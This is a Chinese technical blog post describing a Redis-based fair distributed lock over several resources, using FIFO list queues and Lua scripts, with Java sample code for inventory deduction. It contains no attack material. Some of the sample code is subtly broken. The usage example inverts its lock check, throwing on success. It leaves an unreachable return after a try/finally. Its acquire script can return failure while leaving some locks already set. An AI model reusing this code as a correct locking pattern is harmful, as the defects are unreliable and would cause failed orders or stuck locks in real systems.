img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"> 1.背景</h2>
<p>在分布式系统架构中，多节点并发访问共享资源是常见场景。当业务涉及多个关联资源的协同操作时（如订单系统中的商品与库存等），传统单资源锁无法满足业务需求，而多资源锁的实现又面临以下挑战：</p>
<ul>
<li>死锁风险：不同节点以不同顺序获取多个锁时易导致死锁</li>
<li>公平性问题：先到请求可能因资源获取顺序不公导致长时间等待</li>
<li>性能瓶颈：分布式锁的获取与释放涉及网络通信，需优化重试机制</li>
</ul>
<h2 data-id="heading-1">2.核心问题</h2>
<h3 data-id="heading-2">2.1 典型业务场景</h3>
<p>以电商库存扣减为例：</p>
<ul>
<li>操作1：扣减商品库存（需锁定商品库存资源）</li>
<li>操作2：扣减仓库库存（需锁定仓库库存资源）</li>
<li>复合操作：同时扣减商品库存和仓库库存（需同时锁定商品库存和仓库库存资源）</li>
</ul>
<h3 data-id="heading-3">2.2 技术痛点</h3>
<ul>
<li>顺序敏感：若操作1先锁商品库存再锁仓库库存，操作2反之，可能形成循环等待</li>
<li>饥饿现象：后到的请求可能抢占先到的请求资源</li>
<li>原子性保障：多资源锁定需保证要么全部成功，要么全部失败</li>
</ul>
<h2 data-id="heading-4">3.问题分析</h2>
<h3 data-id="heading-5">3.1.现有方案对比</h3>



































<table><thead><tr><th/><th/><th/></tr></thead><tbody><tr><td><strong>方案类型</strong></td><td><strong>优点</strong></td><td><strong>缺点</strong></td></tr><tr><td>单资源锁</td><td>实现简单</td><td>无法处理多资源关联场景</td></tr><tr><td>顺序锁</td><td>避免死锁</td><td>需严格约定加锁顺序，灵活性差</td></tr><tr><td>RedLock算法</td><td>高可用</td><td>不保证公平性，时钟漂移问题</td></tr><tr><td>队列等待机制</td><td>天然公平</td><td>实现复杂，需处理超时和重试</td></tr></tbody></table>
<h3 data-id="heading-6">3.2.关键需求</h3>
<ul>
<li>公平性：保证先到请求优先获取资源</li>
<li>原子性：多资源锁定/释放的原子操作</li>
<li>灵活性：支持单/双资源混合锁定</li>
<li>容错性：超时自动释放避免死锁</li>
</ul>
<h2 data-id="heading-7">4.解决方案：多资源分布式顺序锁</h2>
<h3 data-id="heading-8">4.1.核心设计思想</h3>
<p>通过Redis实现基于等待队列的公平锁机制，结合Lua脚本保证原子性操作，主要包含：</p>
<ul>
<li>多Key设计：队列Key（维护请求顺序） + 锁Key（实际资源锁定）</li>
<li>多阶段验证：先确认队列头部位置，再执行原子加锁</li>
<li>多资源支持：通过统一资源标识处理多资源场景</li>
</ul>
<h3 data-id="heading-9">4.2.技术实现详解</h3>
<h4 data-id="heading-10">4.2.1 关键组件</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicResourceLock</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span>  RedisTemplate&lt;String, String&gt; redisTemplate;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">lockPrefix</span> <span class="hljs-operator">=</span> <span class="hljs-string">"mall:Lock:"</span>; <span class="hljs-comment">//锁前缀</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">queuePrefix</span> <span class="hljs-operator">=</span> <span class="hljs-string">"mall:Queue:"</span>; <span class="hljs-comment">//队列前缀</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">defaultTimeout</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>; <span class="hljs-comment">// 默认超时时间（秒）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">lockTTL</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>; <span class="hljs-comment">// 锁持有时间（秒）</span>
    
}
</code></pre>
<h4 data-id="heading-11">4.2.2核心流程</h4>
<p><strong>1.资源注册</strong></p>
<ul>
<li>将有效资源ID（r1,r2）统一处理为字符串列表</li>
<li>示例：<code>getValidResources("C123", "W456")</code> → ["<code>C123</code>", "<code>W456</code>"]</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">private</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">getValidResources</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> cId, <span class="hljs-built_in">String</span> wId</span>) {
    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; resources = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-comment">// 添加原有的uocId和jshId资源</span>
    <span class="hljs-title class_">Arrays</span>.<span class="hljs-title function_">stream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]{cId, wId})
            .<span class="hljs-title function_">filter</span>(<span class="hljs-title class_">Objects</span>::nonNull)
            .<span class="hljs-title function_">filter</span>(s -&gt; !s.<span class="hljs-title function_">isEmpty</span>())
            .<span class="hljs-title function_">forEach</span>(<span class="hljs-attr">resources</span>::add);
    <span class="hljs-keyword">return</span> resources;
}
</code></pre>
<p><strong>2.入队操作</strong></p>
<ul>
<li>使用Redis List的rightPush保证FIFO顺序</li>
<li>设置队列TTL防止死队列</li>
<li>设置lockId ****锁标识符，确保只有合法的持有者才能释放锁</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/**
 * 尝试获取锁（自动处理单/双资源）
 * <span class="hljs-doctag">@param</span> r1 资源1（可为null）
 * <span class="hljs-doctag">@param</span> r2 资源2（可为null）
 * <span class="hljs-doctag">@return</span> 锁ID（失败返回null）
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">tryLock</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> r1, <span class="hljs-built_in">String</span> r2</span>) {
    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; resources = <span class="hljs-title function_">getValidResources</span>(r1, r2);
    <span class="hljs-keyword">if</span> (resources.<span class="hljs-title function_">isEmpty</span>()) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"至少需要一个有效资源ID"</span>);
    }

    <span class="hljs-title class_">String</span> lockId = <span class="hljs-variable constant_">UUID</span>.<span class="hljs-title function_">randomUUID</span>().<span class="hljs-title function_">toString</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">tryLock</span>(resources, lockId, defaultTimeout) ? lockId : <span class="hljs-literal">null</span>;
}



<span class="hljs-comment">/**
 * 获取锁
 * <span class="hljs-doctag">@param</span> resources 资源
 * <span class="hljs-doctag">@param</span> lockId 锁唯一标识
 * <span class="hljs-doctag">@param</span> timeout 是获取锁的最大等待时间
 * <span class="hljs-doctag">@return</span> 是否成功获取到锁
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">tryLock</span>(<span class="hljs-params">List&lt;<span class="hljs-built_in">String</span>&gt; resources, <span class="hljs-built_in">String</span> lockId, long timeout</span>) {
    long start = <span class="hljs-title class_">System</span>.<span class="hljs-title function_">currentTimeMillis</span>();
    <span class="hljs-comment">// 1. 加入所有资源的等待队列</span>
    resources.<span class="hljs-title function_">forEach</span>(res -&gt; <span class="hljs-title function_">enqueue</span>(res, lockId));
    log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"已加入资源队列，资源：{}，锁ID：{}"</span>, resources, lockId);
    
    ....
    
}


<span class="hljs-comment">/**
 * 资源加入队列
 * <span class="hljs-doctag">@param</span> resource 资源
 * <span class="hljs-doctag">@param</span> lockId 锁唯一标识
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">enqueue</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> resource, <span class="hljs-built_in">String</span> lockId</span>) {
    redisTemplate.<span class="hljs-title function_">opsForList</span>().<span class="hljs-title function_">rightPush</span>(queuePrefix + resource, lockId);
    redisTemplate.<span class="hljs-title function_">expire</span>(queuePrefix + resource, lockTTL, <span class="hljs-title class_">TimeUnit</span>.<span class="hljs-property">SECONDS</span>);
}
</code></pre>
<p><strong>3.原子加锁</strong></p>
<p>lua脚本分析</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-comment">-- 检查所有资源队列的队首是否都是当前请求</span>
<span class="hljs-keyword">local</span> all_ready = <span class="hljs-number">1</span>
<span class="hljs-keyword">local</span> queue_key_count = #KEYS / <span class="hljs-number">2</span>  <span class="hljs-comment">-- 计算队列key的数量</span>

<span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, queue_key_count <span class="hljs-keyword">do</span>
   <span class="hljs-keyword">local</span> queue_key = KEYS[i]
   <span class="hljs-comment">-- 检查数据结构类型是否为list</span>
   <span class="hljs-keyword">if</span> redis.call(<span class="hljs-string">'type'</span>, queue_key)[<span class="hljs-string">'ok'</span>] ~= <span class="hljs-string">'list'</span> <span class="hljs-keyword">then</span>
       <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>  <span class="hljs-comment">-- 数据结构错误</span>
   <span class="hljs-keyword">end</span>
   <span class="hljs-comment">-- 检查队首元素是否是当前lockId</span>
   <span class="hljs-keyword">if</span> redis.call(<span class="hljs-string">'lindex'</span>, queue_key, <span class="hljs-number">0</span>) ~= ARGV[<span class="hljs-number">1</span>] <span class="hljs-keyword">then</span>
       all_ready = <span class="hljs-number">0</span>  <span class="hljs-comment">-- 不是队首，设置标志位</span>
       <span class="hljs-keyword">break</span>  <span class="hljs-comment">-- 跳出循环</span>
   <span class="hljs-keyword">end</span>
<span class="hljs-keyword">end</span>

<span class="hljs-comment">-- 如果所有队列的队首都是当前请求</span>
<span class="hljs-keyword">if</span> all_ready == <span class="hljs-number">1</span> <span class="hljs-keyword">then</span>
   <span class="hljs-comment">-- 遍历所有锁key（KEYS的后半部分）</span>
   <span class="hljs-keyword">for</span> i = queue_key_count + <span class="hljs-number">1</span>, #KEYS <span class="hljs-keyword">do</span>
       <span class="hljs-keyword">local</span> lock_key = KEYS[i]
       <span class="hljs-comment">-- 尝试设置锁（带过期时间和NX条件）</span>
       redis.call(<span class="hljs-string">'set'</span>, lock_key, ARGV[<span class="hljs-number">1</span>], <span class="hljs-string">'EX'</span>, ARGV[<span class="hljs-number">2</span>], <span class="hljs-string">'NX'</span>)
       <span class="hljs-comment">-- 验证锁是否设置成功</span>
       <span class="hljs-keyword">if</span> redis.call(<span class="hljs-string">'get'</span>, lock_key) ~= ARGV[<span class="hljs-number">1</span>] <span class="hljs-keyword">then</span>
           <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>  <span class="hljs-comment">-- 获取锁失败</span>
       <span class="hljs-keyword">end</span>
   <span class="hljs-keyword">end</span>
   <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>  <span class="hljs-comment">-- 所有锁获取成功</span>
<span class="hljs-keyword">else</span>
   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>  <span class="hljs-comment">-- 不是所有队列的队首</span>
<span class="hljs-keyword">end</span>
</code></pre>
<p><strong>获取锁</strong></p>
<ul>
<li>100ms间隔检查是否到达队列头部、是否能获取到锁</li>
<li>超时后自动清理残留请求</li>
</ul>
<pre><code class="hljs language-swift" lang="swift">
<span class="hljs-comment">//--------------- 核心实现 ---------------//</span>
<span class="hljs-comment">/**
 * 获取锁
 * @param resources 资源
 * @param lockId 锁唯一标识
 * @param timeout 是获取锁的最大等待时间
 * @return 是否成功获取到锁
 */</span>
<span class="hljs-keyword">private</span> boolean tryLock(<span class="hljs-type">List</span>&lt;<span class="hljs-type">String</span>&gt; resources, <span class="hljs-type">String</span> lockId, long timeout) {
    long start <span class="hljs-operator">=</span> <span class="hljs-type">System</span>.currentTimeMillis();
    <span class="hljs-comment">// 1. 加入所有资源的等待队列</span>
    resources.forEach(res -&gt; enqueue(res, lockId));
    log.info(<span class="hljs-string">"已加入资源队列，资源：{}，锁ID：{}"</span>, resources, lockId);
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">while</span> (<span class="hljs-type">System</span>.currentTimeMillis() <span class="hljs-operator">-</span> start <span class="hljs-operator">&lt;</span> timeout <span class="hljs-operator">*</span> <span class="hljs-number">1000</span>) {
            <span class="hljs-comment">// 2. 检查是否在所有资源队列头部</span>
            <span class="hljs-keyword">if</span> (checkAndLock(resources, lockId)) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            }
            <span class="hljs-type">TimeUnit</span>.<span class="hljs-type">MILLISECONDS</span>.sleep(<span class="hljs-number">100</span>); <span class="hljs-comment">// 轮询间隔</span>
        }
    } <span class="hljs-keyword">catch</span> (<span class="hljs-type">InterruptedException</span> e) {
        <span class="hljs-type">Thread</span>.currentThread().interrupt();
    } finally {
        <span class="hljs-comment">// 3. 超时后清理队列</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span>isLockAcquired(resources, lockId)) {
            resources.forEach(res -&gt; removeFromQueue(res, lockId));
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}


<span class="hljs-comment">/**
 * 检查是否达到队列头部并获取锁
 * @param resources 资源
 * @param lockId 锁唯一标识
 * @return 是否成功获取到锁
 */</span>
<span class="hljs-keyword">private</span> boolean checkAndLock(<span class="hljs-type">List</span>&lt;<span class="hljs-type">String</span>&gt; resources, <span class="hljs-type">String</span> lockId) {
    <span class="hljs-type">String</span> luaScript <span class="hljs-operator">=</span>
            <span class="hljs-string">"local all_ready = 1<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"local queue_key_count = #KEYS / 2<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"for i = 1, queue_key_count do<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"   local queue_key = KEYS[i]<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"   if redis.call('type', queue_key)['ok'] ~= 'list' then<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"       return -1<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"   end<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"   if redis.call('lindex', queue_key, 0) ~= ARGV[1] then<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"       all_ready = 0<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"       break<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"   end<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"end<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"if all_ready == 1 then<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"   for i = queue_key_count + 1, #KEYS do<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"       local lock_key = KEYS[i]<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"       redis.call('set', lock_key, ARGV[1], 'EX', ARGV[2], 'NX')<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"       if redis.call('get', lock_key) ~= ARGV[1] then<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"           return 0<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"       end<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"   end<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"   return 1<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"else<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"   return 0<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                    <span class="hljs-string">"end"</span>;

    <span class="hljs-type">List</span>&lt;<span class="hljs-type">String</span>&gt; keys <span class="hljs-operator">=</span> new <span class="hljs-type">ArrayList</span>&lt;&gt;();

    <span class="hljs-comment">// 队列Key</span>
    resources.forEach(res -&gt; keys.add(queuePrefix <span class="hljs-operator">+</span> res));

    <span class="hljs-comment">// 锁Key</span>
    resources.forEach(res -&gt; keys.add(lockPrefix <span class="hljs-operator">+</span> res));

    <span class="hljs-type">DefaultRedisScript</span>&lt;<span class="hljs-type">Long</span>&gt; script <span class="hljs-operator">=</span> new <span class="hljs-type">DefaultRedisScript</span>&lt;&gt;(luaScript, <span class="hljs-type">Long</span>.class);
    log.info(<span class="hljs-string">"尝试获取锁，keys:{},lockId:{}"</span>,keys,lockId);
    <span class="hljs-type">Long</span> result <span class="hljs-operator">=</span> redisTemplate.execute(script, keys, lockId, lockTTL);
    log.info(<span class="hljs-string">"获取锁结果：{},keys:{},lockId:{}"</span>,result <span class="hljs-operator">==</span> 1L,keys,lockId);
    <span class="hljs-keyword">return</span>  result <span class="hljs-operator">==</span> 1L;
}



<span class="hljs-comment">/**
 * 该组资源是否被lockId持有
 * @param resources 资源
 * @param lockId 锁唯一标识
 * @return true:全部被lockId持有  false：不被lockId持有
 */</span>
<span class="hljs-keyword">private</span> boolean isLockAcquired(<span class="hljs-type">List</span>&lt;<span class="hljs-type">String</span>&gt; resources, <span class="hljs-type">String</span> lockId) {
    <span class="hljs-keyword">return</span> resources.stream()
            .allMatch(res -&gt; lockId.equals(
                    redisTemplate.opsForValue().get(lockPrefix <span class="hljs-operator">+</span> res)
            ));
}
</code></pre>
<ul>
<li>
<p>参数说明：</p>
<ul>
<li>KEYS[1..n]：队列Key列表</li>
<li>KEYS[n+1..2n]：对应锁Key列表</li>
<li>ARGV[1]：lockId</li>
<li>ARGV[2]：TTL</li>
</ul>
</li>
</ul>
<p><strong>4.解锁流程</strong></p>
<ul>
<li>验证锁归属后同时删除锁和出队</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/**
 * 释放锁、资源出队列
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">unlock</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> r1, <span class="hljs-built_in">String</span> r2, <span class="hljs-built_in">String</span> lockId</span>) {
    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; resources = <span class="hljs-title function_">getValidResources</span>(r1, r2);
    resources.<span class="hljs-title function_">forEach</span>(res -&gt; <span class="hljs-title function_">releaseLock</span>(res, lockId));
    resources.<span class="hljs-title function_">forEach</span>(res -&gt; <span class="hljs-title function_">removeFromQueue</span>(res, lockId));
}


<span class="hljs-comment">/**
 * 释放锁
 * <span class="hljs-doctag">@param</span> resource 资源
 * <span class="hljs-doctag">@param</span> lockId 锁唯一标识
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">releaseLock</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> resource, <span class="hljs-built_in">String</span> lockId</span>) {
    <span class="hljs-title class_">String</span> luaScript =
            <span class="hljs-string">"if redis.call('get', KEYS[1]) == ARGV[1] then\n"</span> +
                    <span class="hljs-string">"   redis.call('del', KEYS[1])\n"</span> +
                    <span class="hljs-string">"   redis.call('lpop', KEYS[2])\n"</span> +
                    <span class="hljs-string">"   return 1\n"</span> +
                    <span class="hljs-string">"else\n"</span> +
                    <span class="hljs-string">"   return 0\n"</span> +
                    <span class="hljs-string">"end"</span>;

    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; keys = <span class="hljs-title class_">Arrays</span>.<span class="hljs-title function_">asList</span>(
            lockPrefix + resource,
            queuePrefix + resource
    );

    redisTemplate.<span class="hljs-title function_">execute</span>(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultRedisScript</span>&lt;&gt;(luaScript, <span class="hljs-title class_">Long</span>.<span class="hljs-property">class</span>),
            keys,
            lockId
    );
}


<span class="hljs-comment">/**
 * 移除队列资源
 * <span class="hljs-doctag">@param</span> resource 资源
 * <span class="hljs-doctag">@param</span> lockId 锁唯一标识
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">removeFromQueue</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> resource, <span class="hljs-built_in">String</span> lockId</span>) {
    redisTemplate.<span class="hljs-title function_">opsForList</span>().<span class="hljs-title function_">remove</span>(queuePrefix + resource, <span class="hljs-number">0</span>, lockId);
    log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"清理资源队列：{},lockId:{}"</span>,resource,lockId);
}
</code></pre>
<h4 data-id="heading-12">4.2.3 示例</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MallServiceImpl</span>  {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">DynamicResourceLock</span> lockUtil;
    
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Boolean</span> <span class="hljs-title function_">deductInventory</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> productId, <span class="hljs-built_in">String</span> warehouseId, int quantity</span>) {
        log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"库存扣减开始"</span>);
        <span class="hljs-title class_">String</span> requestId = <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">try</span> {
            requestId = lockUtil.<span class="hljs-title function_">tryLock</span>(productId, warehouseId);
            <span class="hljs-keyword">if</span> (<span class="hljs-title class_">StringUtils</span>.<span class="hljs-title function_">isNotEmpty</span>(requestId)) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BizException</span>(<span class="hljs-title class_">DefaultErrorCode</span>.<span class="hljs-property">EXECUTE_FAIL</span>,<span class="hljs-string">"库存扣减获取锁失败，请重试"</span>);
            }
          
           log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"deductInventory-,库存扣减获取锁成功"</span>);
            <span class="hljs-comment">// 执行业务操作</span>
            ...
            <span class="hljs-keyword">return</span> <span class="hljs-title class_">Boolean</span>.<span class="hljs-property">TRUE</span>;
        }  <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (<span class="hljs-title class_">StringUtils</span>.<span class="hljs-title function_">isNotEmpty</span>(requestId)) {
                lockUtil.<span class="hljs-title function_">unlock</span>(productId, warehouseId,requestId);
                log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"deductInventory-库存扣减释放锁成功"</span>);
            }
        }
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Boolean</span>.<span class="hljs-property">TRUE</span>;
    }
}
</code></pre>
<h3 data-id="heading-13">4.3技术亮点</h3>
<h4 data-id="heading-14">4.3.1公平性保障</h4>
<ul>
<li>通过Redis List的FIFO特性实现天然排队</li>
<li>只有队列头部请求可获取锁</li>
</ul>
<h4 data-id="heading-15">4.3.2原子性操作</h4>
<ul>
<li>使用Lua脚本将多个Redis命令打包为原子操作</li>
<li>避免竞态条件</li>
</ul>
<h4 data-id="heading-16">4.3.3多资源支持</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">lock</span>.tryLock(<span class="hljs-string">"C123"</span>, <span class="hljs-string">"W456"</span>);
</code></pre>
<h4 data-id="heading-17">4.3.4容错设计</h4>
<ul>
<li>超时自动释放机制</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">private</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">tryLock</span>(<span class="hljs-params">List&lt;<span class="hljs-built_in">String</span>&gt; resources, <span class="hljs-built_in">String</span> lockId, long timeout</span>) {
    long start = <span class="hljs-title class_">System</span>.<span class="hljs-title function_">currentTimeMillis</span>();
    <span class="hljs-comment">// 1. 加入所有资源的等待队列</span>
    resources.<span class="hljs-title function_">forEach</span>(res -&gt; <span class="hljs-title function_">enqueue</span>(res, lockId));
    log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"已加入资源队列，资源：{}，锁ID：{}"</span>, resources, lockId);
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">while</span> (<span class="hljs-title class_">System</span>.<span class="hljs-title function_">currentTimeMillis</span>() - start &lt; timeout * <span class="hljs-number">1000</span>) {
            <span class="hljs-comment">// 2. 检查是否在所有资源队列头部</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_">checkAndLock</span>(resources, lockId)) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            }
            <span class="hljs-title class_">TimeUnit</span>.<span class="hljs-property">MILLISECONDS</span>.<span class="hljs-title function_">sleep</span>(<span class="hljs-number">100</span>); <span class="hljs-comment">// 轮询间隔</span>
        }
    } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">InterruptedException</span> e) {
        <span class="hljs-title class_">Thread</span>.<span class="hljs-title function_">currentThread</span>().<span class="hljs-title function_">interrupt</span>();
    } <span class="hljs-keyword">finally</span> {
        <span class="hljs-comment">// 3. 超时后清理队列</span>
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isLockAcquired</span>(resources, lockId)) {
            resources.<span class="hljs-title function_">forEach</span>(res -&gt; <span class="hljs-title function_">removeFromQueue</span>(res, lockId));
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}

<span class="hljs-keyword">private</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isLockAcquired</span>(<span class="hljs-params">List&lt;<span class="hljs-built_in">String</span>&gt; resources, <span class="hljs-built_in">String</span> lockId</span>) {
    <span class="hljs-keyword">return</span> resources.<span class="hljs-title function_">stream</span>()
            .<span class="hljs-title function_">allMatch</span>(res -&gt; lockId.<span class="hljs-title function_">equals</span>(
                    redisTemplate.<span class="hljs-title function_">opsForValue</span>().<span class="hljs-title function_">get</span>(lockPrefix + res)
            ));
}
</code></pre>
<ul>
<li>锁TTL略大于业务操作时间</li>
</ul>
<h2 data-id="heading-18">5. 团队介绍</h2>
